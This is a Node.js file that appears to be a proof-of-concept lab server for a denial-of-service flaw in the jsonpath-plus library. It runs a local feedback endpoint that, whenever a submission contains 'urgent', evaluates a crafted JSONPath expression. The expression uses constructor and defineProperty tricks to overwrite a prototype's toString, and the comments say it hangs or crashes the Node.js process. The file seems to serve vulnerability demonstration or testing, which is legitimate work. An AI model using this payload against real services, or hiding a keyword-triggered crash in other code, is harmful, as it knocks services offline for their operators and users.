const http = require('http');
const fs   = require('fs');
const path = require('path');
const { JSONPath } = require('jsonpath-plus');

const PORT = 3000;

// The malicious JSONPath expression for the DoS
const pathDoS =
  "$[?(con = constructor; dp = con.defineProperty; gopd = con.getOwnPropertyDescriptor;" +
  " f = gopd(con, 'entries').value; alt = gopd(con.getPrototypeOf(f), 'apply');" +
  " dp(con.getPrototypeOf(_$_root.body), 'toString', alt);)]";

function timestamp() {
  return new Date().toISOString();
}

http.createServer((req, res) => {
  if (req.method === 'GET' && req.url === '/') {
    // Serve the HTML from Files/public/index.html
    const html = fs.readFileSync(path.join(__dirname, 'public', 'index.html'));
    res.writeHead(200, { 'Content-Type': 'text/html' });
    return res.end(html);
  }

  if (req.method === 'POST' && req.url === '/submit-feedback') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      const response = { success: false, message: '', logs: [] };
      response.logs.push(`${timestamp()} Received feedback submission`);

      let feedback;
      try {
        feedback = JSON.parse(body).feedback || '';
      } catch {
        response.message = 'Invalid JSON.';
        response.logs.push(`${timestamp()} Failed to parse JSON`);
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify(response));
      }

      response.logs.push(`${timestamp()} Feedback content: ${feedback}`);

      // Trigger DoS if feedback contains word "urgent"
      if (/urgent/i.test(feedback)) {
        response.logs.push(`${timestamp()} Keyword "urgent" detected â€” triggering DoS PoC`);

        const result = JSONPath({
          json: { body: { value: feedback, writable: true } },
          path: pathDoS
        });
        // This will hang or crash Node.js
        result.toString();

        // Fallback if it did not crash
        response.message = 'Unexpected: DoS did not trigger as expected';
      } else {
        response.success = true;
        response.message = 'Thank you! Your feedback has been recorded.';
        response.logs.push(`${timestamp()} Feedback accepted`);
      }

      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(response));
    });
    return;
  }

  res.writeHead(404);
  res.end();
}).listen(PORT, () => {
  console.log(`Feedback service running at http://localhost:${PORT}`);
});
